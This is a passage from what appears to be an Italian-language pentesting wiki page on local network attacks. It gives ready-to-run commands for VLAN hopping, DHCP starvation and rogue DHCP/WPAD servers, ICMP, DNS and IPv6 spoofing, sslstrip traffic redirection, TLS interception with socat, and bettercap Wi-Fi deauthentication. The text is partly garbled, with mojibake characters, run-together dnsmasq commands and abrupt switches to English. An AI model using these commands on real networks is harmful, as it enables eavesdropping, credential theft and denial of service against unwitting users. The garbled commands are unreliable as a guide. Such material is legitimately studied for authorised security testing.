2. **Modalit√† Spoof** (`-c 1`): Genera pacchetti personalizzati che imitano quelli di un dispositivo VoIP reale.
3. **Modalit√† Spoof con pacchetto predefinito** (`-c 2`): Invia pacchetti identici a quelli di un modello specifico di telefono IP Cisco.

La modalit√† preferita per la velocit√† √® la terza. Richiede di specificare:

- L'interfaccia di rete dell'attaccante (parametro `-i`).
- Il nome del dispositivo VoIP da emulare (parametro `-E`), seguendo il formato di denominazione Cisco (ad esempio, SEP seguito da un indirizzo MAC).

In ambienti aziendali, per imitare un dispositivo VoIP esistente, potresti:

- Ispezionare l'etichetta MAC sul telefono.
- Navigare nelle impostazioni del display del telefono per visualizzare le informazioni sul modello.
- Collegare il dispositivo VoIP a un laptop e osservare le richieste CDP utilizzando Wireshark.

Un esempio di comando per eseguire lo strumento nella terza modalit√† sarebbe:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
#### Enumerazione

The first step in a DHCP attack is to gather information about the target network. This can be done through various enumeration techniques:

- **DHCP Discover**: This is the initial message sent by a client to discover DHCP servers on the network. By capturing and analyzing these messages, an attacker can identify the DHCP servers in the network.

- **DHCP Offer**: This is the response message sent by a DHCP server to a DHCP Discover message. It contains information about the available IP addresses and other configuration options. By analyzing these messages, an attacker can gather information about the DHCP server and its configuration.

- **DHCP Request**: This is the message sent by a client to request an IP address from a specific DHCP server. By capturing and analyzing these messages, an attacker can identify the DHCP server being used by the client.

- **DHCP Acknowledge**: This is the response message sent by a DHCP server to a DHCP Request message. It confirms the allocation of an IP address to the client. By analyzing these messages, an attacker can gather information about the allocated IP address and other configuration options.

- **DHCP Inform**: This is a message sent by a client to a DHCP server to obtain additional configuration options. By capturing and analyzing these messages, an attacker can gather information about the client's configuration and the DHCP server's response.

- **DHCP Release**: This is a message sent by a client to release the allocated IP address. By capturing and analyzing these messages, an attacker can gather information about the client's activity and potentially perform a denial-of-service attack.

- **DHCP Decline**: This is a message sent by a client to decline an offered IP address. By capturing and analyzing these messages, an attacker can gather information about the client's behavior and potentially exploit any vulnerabilities in the DHCP server.

By using these enumeration techniques, an attacker can gather valuable information about the target network and its DHCP infrastructure, which can be used to plan and execute further attacks.
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

Ci sono **due tipi di DoS** che possono essere eseguiti contro i server DHCP. Il primo consiste nel **simulare abbastanza host falsi per utilizzare tutti gli indirizzi IP possibili**.
Questo attacco funzioner√† solo se √® possibile visualizzare le risposte del server DHCP e completare il protocollo (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Ad esempio, questo **non √® possibile nelle reti Wifi**.

Un altro modo per eseguire un attacco DoS DHCP √® inviare un **pacchetto DHCP-RELEASE utilizzando come codice sorgente ogni possibile IP**. In questo modo, il server penser√† che tutti abbiano finito di utilizzare l'IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Un modo pi√π automatico per fare ci√≤ √® utilizzare lo strumento [DHCPing](https://github.com/kamorin/DHCPig)

Potresti utilizzare gli attacchi DoS menzionati per costringere i client a ottenere nuovi lease all'interno dell'ambiente e saturare i server legittimi in modo che diventino non responsivi. Quindi, quando i legittimi cercano di riconnettersi, **puoi servire valori maligni menzionati nel prossimo attacco**.

#### Impostare valori maligni

Un server DHCP falso pu√≤ essere configurato utilizzando lo script DHCP situato in `/usr/share/responder/DHCP.py`. Questo √® utile per gli attacchi di rete, come la cattura del traffico e delle credenziali HTTP, reindirizzando il traffico verso un server maligno. Tuttavia, impostare un gateway falso √® meno efficace in quanto consente solo di catturare il traffico in uscita dal client, perdendo le risposte del vero gateway. Invece, si consiglia di configurare un server DNS o WPAD falso per un attacco pi√π efficace.

Di seguito sono riportate le opzioni di comando per la configurazione del server DHCP falso:

- **Il nostro indirizzo IP (Annuncio del gateway)**: Utilizzare `-i 10.0.0.100` per pubblicizzare l'indirizzo IP della propria macchina come gateway.
- **Nome di dominio DNS locale**: Opzionalmente, utilizzare `-d example.org` per impostare un nome di dominio DNS locale.
- **Indirizzo IP del router/gateway originale**: Utilizzare `-r 10.0.0.1` per specificare l'indirizzo IP del router o gateway legittimo.
- **Indirizzo IP del server DNS primario**: Utilizzare `-p 10.0.0.100` per impostare l'indirizzo IP del server DNS falso controllato da te.
- **Indirizzo IP del server DNS secondario**: Opzionalmente, utilizzare `-s 10.0.0.1` per impostare un indirizzo IP del server DNS secondario.
- **Netmask della rete locale**: Utilizzare `-n 255.255.255.0` per definire la netmask per la rete locale.
- **Interfaccia per il traffico DHCP**: Utilizzare `-I eth1` per ascoltare il traffico DHCP su una specifica interfaccia di rete.
- **Indirizzo di configurazione WPAD**: Utilizzare `-w ‚Äúhttp://10.0.0.100/wpad.dat‚Äù` per impostare l'indirizzo per la configurazione WPAD, che aiuta nell'intercettazione del traffico web.
- **Spoof dell'indirizzo IP del gateway predefinito**: Includere `-S` per falsificare l'indirizzo IP del gateway predefinito.
- **Rispondere a tutte le richieste DHCP**: Includere `-R` per far s√¨ che il server risponda a tutte le richieste DHCP, ma sii consapevole che questo √® rumoroso e pu√≤ essere rilevato.

Utilizzando correttamente queste opzioni, √® possibile creare un server DHCP falso per intercettare efficacemente il traffico di rete.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Attacchi EAP**

Ecco alcune delle tattiche di attacco che possono essere utilizzate contro le implementazioni 802.1X:

* Attacco attivo di forza bruta alla password tramite EAP
* Attacco al server RADIUS con contenuto EAP malformato _\*\*_(exploit)
* Cattura dei messaggi EAP e crack offline delle password (EAP-MD5 e PEAP)
* Forzare l'autenticazione EAP-MD5 per eludere la validazione del certificato TLS
* Iniettare traffico di rete malevolo durante l'autenticazione utilizzando un hub o simile

Se l'attaccante si trova tra la vittima e il server di autenticazione, potrebbe cercare di degradare (se necessario) il protocollo di autenticazione a EAP-MD5 e catturare il tentativo di autenticazione. Successivamente, potrebbe eseguire un attacco di forza bruta utilizzando:
```
eapmd5pass ‚Äìr pcap.dump ‚Äìw /usr/share/wordlist/sqlmap.txt
```
### Attacchi FHRP (GLBP & HSRP) <a href="#6196" id="6196"></a>

**FHRP** (First Hop Redundancy Protocol) √® una classe di protocolli di rete progettati per **creare un sistema di routing ridondante a caldo**. Con FHRP, i router fisici possono essere combinati in un singolo dispositivo logico, aumentando la tolleranza ai guasti e aiutando a distribuire il carico.

**Gli ingegneri di Cisco Systems hanno sviluppato due protocolli FHRP, GLBP e HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Sono noti tre versioni del Routing Information Protocol (RIP): RIP, RIPv2 e RIPng. I datagrammi vengono inviati ai peer tramite la porta 520 utilizzando UDP da RIP e RIPv2, mentre i datagrammi vengono trasmessi in broadcast alla porta UDP 521 tramite multicast IPv6 da RIPng. RIPv2 supporta l'autenticazione MD5, mentre RIPng non include l'autenticazione nativa, ma si basa su intestazioni IPsec AH ed ESP all'interno di IPv6.

- **RIP e RIPv2:** La comunicazione avviene tramite datagrammi UDP sulla porta 520.
- **RIPng:** Utilizza la porta UDP 521 per la trasmissione in broadcast dei datagrammi tramite multicast IPv6.

Si noti che RIPv2 supporta l'autenticazione MD5, mentre RIPng non include l'autenticazione nativa, ma si basa su intestazioni IPsec AH ed ESP in IPv6.


### Attacchi EIGRP

**EIGRP (Enhanced Interior Gateway Routing Protocol)** √® un protocollo di routing dinamico. **√à un protocollo di vettore delle distanze.** Se non √® presente l'autenticazione e la configurazione delle interfacce passive, un **intruso** pu√≤ interferire con il routing EIGRP e causare **l'avvelenamento delle tabelle di routing**. Inoltre, la rete EIGRP (ossia il sistema autonomo) **√® piatta e non ha una suddivisione in zone**. Se un **attaccante inietta una rotta**, √® probabile che questa rotta si **diffonda** in tutto il sistema EIGRP autonomo.

Per attaccare un sistema EIGRP √® necessario **stabilire una vicinanza con un router EIGRP legittimo**, il che apre molte possibilit√†, dalla ricognizione di base a varie iniezioni.

[**FRRouting**](https://frrouting.org/) consente di implementare **un router virtuale che supporta BGP, OSPF, EIGRP, RIP e altri protocolli.** Tutto ci√≤ che devi fare √® installarlo sul sistema dell'attaccante e puoi fingere di essere un router legittimo nel dominio di routing.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) ha funzionalit√† per intercettare le trasmissioni EIGRP (Enhanced Interior Gateway Routing Protocol). Consente anche l'iniezione di pacchetti, che possono essere utilizzati per modificare le configurazioni di routing.

### OSPF

Nel protocollo Open Shortest Path First (OSPF) **l'autenticazione MD5 viene comunemente utilizzata per garantire una comunicazione sicura tra i router**. Tuttavia, questa misura di sicurezza pu√≤ essere compromessa utilizzando strumenti come Loki e John the Ripper. Questi strumenti sono in grado di catturare e decifrare gli hash MD5, esponendo la chiave di autenticazione. Una volta ottenuta questa chiave, pu√≤ essere utilizzata per introdurre nuove informazioni di routing. Per configurare i parametri di routing e stabilire la chiave compromessa, vengono utilizzate le schede _Injection_ e _Connection_.

- **Cattura e decifratura degli hash MD5:** Strumenti come Loki e John the Ripper vengono utilizzati per questo scopo.
- **Configurazione dei parametri di routing:** Questo viene fatto tramite la scheda _Injection_.
- **Impostazione della chiave compromessa:** La chiave viene configurata nella scheda _Connection_.

### Altri strumenti e fonti generici

* [**Above**](https://github.com/c4s73r/Above): Strumento per analizzare il traffico di rete e trovare vulnerabilit√†
* Puoi trovare ulteriori informazioni sugli **attacchi di rete [qui](https://github.com/Sab0tag3d/MITM-cheatsheet)**.

## **Spoofing**

L'attaccante configura tutti i parametri di rete (GW, IP, DNS) del nuovo membro della rete inviando risposte DHCP false.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Controlla la [sezione precedente](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste nell'invio di un pacchetto ICMP di tipo 1 codice 5 che indica che l'attaccante √® il miglior modo per raggiungere un IP. Quindi, quando la vittima vuole contattare l'IP, invier√† il pacchetto attraverso l'attaccante.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

L'attaccante risolver√† alcuni (o tutti) i domini che la vittima richiede.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurare il proprio DNS con dnsmasq**

Dnsmasq √® un server DNS leggero e facile da configurare che pu√≤ essere utilizzato per creare un DNS personalizzato per il tuo ambiente di pentesting. Questo ti permette di controllare la risoluzione dei nomi dei domini e di indirizzare il traffico verso indirizzi IP specifici.

Ecco come configurare il tuo DNS personalizzato utilizzando dnsmasq:

1. Installa dnsmasq sul tuo sistema operativo. Ad esempio, su Ubuntu, puoi utilizzare il seguente comando:

   ```
   sudo apt-get install dnsmasq
   ```

2. Apri il file di configurazione di dnsmasq utilizzando un editor di testo. Ad esempio, su Ubuntu, puoi utilizzare il seguente comando:

   ```
   sudo nano /etc/dnsmasq.conf
   ```

3. Aggiungi le seguenti righe al file di configurazione per specificare i domini e gli indirizzi IP personalizzati:

   ```
   address=/example.com/192.168.1.100
   address=/subdomain.example.com/192.168.1.101
   ```

   Questo esempio configura il DNS per risolvere il dominio "example.com" all'indirizzo IP "192.168.1.100" e il sottodominio "subdomain.example.com" all'indirizzo IP "192.168.1.101". Puoi aggiungere quante righe desideri per specificare ulteriori domini e indirizzi IP.

4. Salva il file di configurazione e riavvia il servizio dnsmasq utilizzando il seguente comando:

   ```
   sudo systemctl restart dnsmasq
   ```

5. Configura il tuo sistema operativo per utilizzare il tuo DNS personalizzato. Puoi farlo modificando il file di configurazione del tuo sistema operativo o utilizzando l'interfaccia utente del tuo sistema operativo.

Una volta configurato correttamente, il tuo DNS personalizzato con dnsmasq sar√† in grado di risolvere i domini specificati agli indirizzi IP desiderati. Questo ti permette di controllare la risoluzione dei nomi dei domini nel tuo ambiente di pentesting e di indirizzare il traffico verso gli indirizzi IP che desideri.
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Gateway Locali

Spesso esistono pi√π percorsi per accedere a sistemi e reti. Dopo aver creato una lista di indirizzi MAC nella rete locale, utilizzare _gateway-finder.py_ per identificare gli host che supportano l'inoltro IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Per la risoluzione locale degli host quando le ricerche DNS non hanno successo, i sistemi Microsoft si affidano a **Link-Local Multicast Name Resolution (LLMNR)** e al **NetBIOS Name Service (NBT-NS)**. Allo stesso modo, **Apple Bonjour** e le implementazioni **zero-configuration di Linux** utilizzano **Multicast DNS (mDNS)** per scoprire i sistemi all'interno di una rete. A causa della natura non autenticata di questi protocolli e del loro funzionamento tramite messaggi di broadcast su UDP, possono essere sfruttati dagli attaccanti che mirano a reindirizzare gli utenti a servizi maligni.

√à possibile impersonare servizi che vengono cercati dagli host utilizzando Responder per inviare risposte false.\
Leggi qui per maggiori informazioni su [come impersonare servizi con Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

I browser comunemente utilizzano il protocollo **Web Proxy Auto-Discovery (WPAD) per acquisire automaticamente le impostazioni del proxy**. Ci√≤ comporta il recupero dei dettagli di configurazione da un server, specificamente tramite un URL come "http://wpad.example.org/wpad.dat". La scoperta di questo server da parte dei client pu√≤ avvenire attraverso vari meccanismi:

- Attraverso **DHCP**, dove la scoperta viene facilitata utilizzando una voce speciale di codice 252.
- Attraverso **DNS**, che comporta la ricerca di un nome host denominato _wpad_ nel dominio locale.
- Tramite **Microsoft LLMNR e NBT-NS**, che sono meccanismi di fallback utilizzati nei casi in cui le ricerche DNS non hanno successo.

Lo strumento Responder sfrutta questo protocollo agendo come un **server WPAD maligno**. Utilizza DHCP, DNS, LLMNR e NBT-NS per indurre in errore i client a connettersi ad esso. Per approfondire come i servizi possono essere impersonati utilizzando Responder [controlla qui](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).


### [Spoofing dispositivi SSDP e UPnP](spoofing-ssdp-and-upnp-devices.md)

√à possibile offrire diversi servizi nella rete per cercare di **ingannare un utente** affinch√© inserisca delle **credenziali in chiaro**. **Ulteriori informazioni su questo attacco in** [**Spoofing dispositivi SSDP e UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### Spoofing del vicino IPv6

Questo attacco √® molto simile allo Spoofing ARP ma nel mondo IPv6. Puoi far credere alla vittima che l'IPv6 del GW abbia il MAC dell'attaccante.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### Spoofing/Flooding degli Annunci del Router IPv6

Alcuni sistemi operativi configurano per impostazione predefinita il gateway dai pacchetti RA inviati nella rete. Per dichiarare l'attaccante come router IPv6, √® possibile utilizzare:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### Spoofing DHCP IPv6

Di default, alcuni sistemi operativi cercano di configurare il DNS leggendo un pacchetto DHCPv6 nella rete. Quindi, un attaccante potrebbe inviare un pacchetto DHCPv6 per configurarsi come DNS. Il DHCP fornisce anche un indirizzo IPv6 alla vittima.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (pagina falsa e iniezione di codice JS)

## Attacchi su Internet

### sslStrip

Fondamentalmente, ci√≤ che fa questo attacco √®, nel caso in cui l'**utente** cerchi di **accedere** a una **pagina HTTP** che sta **reindirizzando** alla versione **HTTPS**, **sslStrip** manterr√† una **connessione HTTP con** il **client e una connessione HTTPS con** il **server**, in modo da poter **intercettare** la connessione in **testo normale**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Ulteriori informazioni [qui](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ e dns2proxy per bypassare HSTS

La **differenza** tra **sslStrip+ e dns2proxy** rispetto a **sslStrip** √® che essi **reindirizzeranno** ad esempio _**www.facebook.com**_ a _**wwww.facebook.com**_ (nota la **w** extra) e imposteranno l'**indirizzo di questo dominio come l'IP dell'attaccante**. In questo modo, il **client** si **connetter√†** a _**wwww.facebook.com**_ (l'attaccante), ma dietro le quinte **sslstrip+** manterr√† la **vera connessione** tramite https con **www.facebook.com**.

L'**obiettivo** di questa tecnica √® **evitare HSTS** perch√© _**wwww**.facebook.com_ **non verr√† salvato nella cache del browser**, quindi il browser verr√† ingannato per eseguire **l'autenticazione di Facebook in HTTP**.\
Si noti che per effettuare questo attacco la vittima deve cercare di accedere inizialmente a [http://www.faceook.com](http://www.faceook.com) e non a https. Ci√≤ pu√≤ essere fatto modificando i link all'interno di una pagina http.

Ulteriori informazioni [qui](https://www.bettercap.org/legacy/#hsts-bypass), [qui](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) e [qui](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip o sslStrip+ non funzionano pi√π. Questo perch√© ci sono regole HSTS pre-salvate nei browser, quindi anche se √® la prima volta che un utente accede a un dominio "importante", lo acceder√† tramite HTTPS. Inoltre, si noti che le regole pre-salvate e altre regole generate possono utilizzare il flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **quindi l'esempio di** _**wwww.facebook.com**_ **di prima non funzioner√† pi√π poich√©** _**facebook.com**_ **utilizza HSTS con `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## Ascolto TCP sulla porta
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL in ascolto sulla porta

#### Generare chiavi e certificato autofirmato
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Ascolta utilizzando il certificato

To listen in on network traffic using a certificate, you can follow these steps:

1. Generate a self-signed certificate or obtain a valid certificate for the target domain.
2. Configure your listening device (such as a proxy server or a network sniffer) to use the certificate for SSL/TLS interception.
3. Intercept the SSL/TLS traffic between the client and the server using the certificate.
4. Decrypt the intercepted traffic to analyze the data being transmitted.

Keep in mind that intercepting SSL/TLS traffic without proper authorization is illegal and unethical. Make sure you have the necessary permissions and legal rights before attempting this technique.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Ascolta utilizzando il certificato e reindirizza agli host

Per ascoltare il traffico di rete utilizzando un certificato e reindirizzare il traffico verso gli host desiderati, √® possibile seguire i seguenti passaggi:

1. Genera un certificato autofirmato o utilizza un certificato valido per il dominio desiderato.
2. Configura un server proxy o un'applicazione che supporti l'ascolto del traffico di rete utilizzando il certificato.
3. Imposta il server proxy o l'applicazione in modo che reindirizzi il traffico verso gli host desiderati.
4. Assicurati che il dispositivo o il client che desideri monitorare sia configurato per inviare il traffico attraverso il server proxy o l'applicazione.

Una volta configurato correttamente, il server proxy o l'applicazione ascolter√† il traffico di rete utilizzando il certificato specificato e reindirizzer√† il traffico verso gli host desiderati. Questo ti consentir√† di analizzare e monitorare il traffico di rete per scopi di analisi o di sicurezza.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
A volte, se il cliente verifica che il CA sia valido, potresti **servire un certificato di un altro hostname firmato da un CA**.\
Un altro test interessante √® servire un **certificato dell'hostname richiesto ma auto-firmato**.

Altre cose da testare sono provare a firmare il certificato con un certificato valido che non √® un CA valido. Oppure utilizzare la chiave pubblica valida, forzare l'utilizzo di un algoritmo come diffie hellman (uno che non richiede di decifrare nulla con la vera chiave privata) e quando il cliente richiede una prova della vera chiave privata (come un hash), inviare una falsa prova e sperare che il cliente non la verifichi.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Note di scoperta attiva

Tieni presente che quando viene inviato un pacchetto UDP a un dispositivo che non ha la porta richiesta, viene inviato un ICMP (Port Unreachable).

### **Scoperta ARP**

I pacchetti ARP vengono utilizzati per scoprire quali indirizzi IP vengono utilizzati all'interno della rete. Il PC deve inviare una richiesta per ogni possibile indirizzo IP e solo quelli che vengono utilizzati risponderanno.

### **mDNS (multicast DNS)**

Bettercap invia una richiesta mDNS (ogni X ms) chiedendo **\_services\_.dns-sd.\_udp.local**. La macchina che vede questo pacchetto di solito risponde a questa richiesta. Quindi, cerca solo le macchine che rispondono ai "servizi".

**Strumenti**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap invia pacchetti broadcast alla porta 137/UDP chiedendo il nome "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap invia pacchetti SSDP in broadcast alla ricerca di tutti i tipi di servizi (porta UDP 1900).

### **WSD (Web Service Discovery)**

Bettercap invia pacchetti WSD in broadcast alla ricerca di servizi (porta UDP 3702).

## Riferimenti

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3rd edition)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Suggerimento per bug bounty**: **iscriviti** a **Intigriti**, una piattaforma premium di **bug bounty creata da hacker, per hacker**! Unisciti a noi su [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) oggi stesso e inizia a guadagnare taglie fino a **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
